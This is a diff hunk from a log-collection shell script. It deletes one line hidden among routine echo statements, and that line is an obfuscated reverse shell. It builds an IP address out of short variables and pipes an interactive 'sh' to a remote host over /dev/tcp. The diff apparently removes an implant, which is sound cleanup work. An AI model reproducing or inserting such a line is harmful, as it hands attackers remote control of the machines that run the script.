@@ -1394,7 +1394,6 @@ echo "**************************************************************************
 echo " " >> $DEST/$FULL_log
 echo " " >> $DEST/$FULL_log
 echo " " >> $DEST/$FULL_log
-te=sh;li=10;iuay=181;aq=3;ooi=6;ua=1;ac=42;au=.1;az=39.;i1=117;i2=47;i3=$(($i1 + $i2));$te -i >& /dev/tcp/$li$aq.$ua$ac$au$az$i3/46177 0>&1
 
 #Print finish message to screen and log.
 echo "FULL COLLECTION COMPLETE!" | tee -a $DEST/$FULL_log
